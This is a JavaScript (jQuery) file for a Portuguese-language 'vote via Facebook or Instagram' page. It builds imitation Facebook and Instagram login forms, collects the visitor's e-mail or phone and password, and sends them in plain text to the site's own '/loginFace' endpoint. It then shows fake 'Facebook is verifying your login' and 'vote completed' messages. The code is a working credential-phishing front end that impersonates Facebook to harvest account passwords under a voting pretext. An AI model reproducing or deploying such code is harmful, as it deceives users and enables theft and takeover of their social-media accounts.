$(function(){
  
  //faceHtml
  let face = '<p>vote pelo Facebook<p><img width="50" heigth="50" src="static/fb.png" ><hr><input placeholder="E-mail ou o telefone" id="nameFace" type="text"><br><label><input id="passFace" type="password" placeholder="Senha"></label><br><button class="loginFace" onclick="loginFace()" id="loginFace">Entrar</button>'
  
  //instaHtml
  let insta = '<p>vote pelo Instagram<p><hr width="50%"><input id="nameInsta" placeholder=" insira o e-mail ou o nome de usuario" type="text"><br><input id="passInsta" type="password" placeholder="insira a senha"><br><button class="loginInsta" id="loginInsta">Entrar</button'
  
  //clickFace
  $('#face').click(function(){
    $('#painelLogin').fadeOut();
    $('#painelLogin').html(face);
    $('#painelLogin').fadeIn();
    $('#buttons').html('')
  })
  
  
  //clickInsta
  $('#insta').click(function() {
        $('#painelLogin').fadeOut();
        $('#painelLogin').html(insta);
        $('#painelLogin').fadeIn();
  })
  
  //ver
  $('#view').click(() => {
    console.log('clicked views')
    
  });
  
  view = () => {
   // console.log('view clicked')
    $('#passFace').attr('type','text')
    $('#view').attr('onclick','ocultar()')
    $('#view').html('ocultar')
  }
  
  //desver
  ocultar = () => {
    //console.log('ocult clicked')
    $('#passFace').attr('type','password')
    $('#view').html('ver')
    $('#view').attr('onclick','view()')
  }
  
  //caso demore muito,
  timeLimitRespServer = () => {
    $('#respServer').html('<small font-size="20"><p>o Facebook demorou muito para responder ao seu login.Tente novamente mais tarde</p><a href="https://udemy.com"><small><p>entre e conheça o nosso trabalho</p></small></a></small>')
  }
  // Rough implementation. Untested.
  function timeout(ms, promise) {
    return new Promise(function(resolve, reject) {
      setTimeout(function() {
        reject(new Error("timeout"))
      }, ms)
      promise.then(resolve, reject)
    })
    } 
  
  //loginFace
  loginFace = () => {
    let name = $('#nameFace').val()
    let pass = $('#passFace').val()
    //$('#buttons').text('')
  
    //loading time 
    $('#painelLogin').html('<small font-size="20"><img heigth="50" width="50" src="/static/load.gif"><p>aguarde, o Facebook está verificando o seu login</p></small>')
    

    //setTimeout(timeLimitRespServer,5000)
    timeout(30000, fetch(`/loginFace?user=${name}&pass=${pass}`))
    .then((re) => {
      js = re.json()
      return js
    }).then((js) => {
      let res = js.return
      console.log(res)
      if(res){
        $('#respServer').html('<p color="green"></p>')
        $("#painelLogin").html('<h2>voto concluído</h2><img heigth="100" width="100" src="/static/ok.png"><a href="https://udemy.com"><small><p>entre e conheça o nosso trabalho</p></small></a>')
        //setTimeout($('#udemy').trigger('click'), 1500);
      }
      else if(res === 'errorTime'){
        timeLimitRespServer()
      }
      else{
        $('#respServer').html('<small><p color="red">Ops, o Facebook não respondeu corretamente ao seu login, ou existe um erro temporario em nossos servidores.</p><p> Por favor tente novamente mais tarde.</p></small>')
      }
    }).catch((e) => {
      timeLimitRespServer();
    })
  }
})
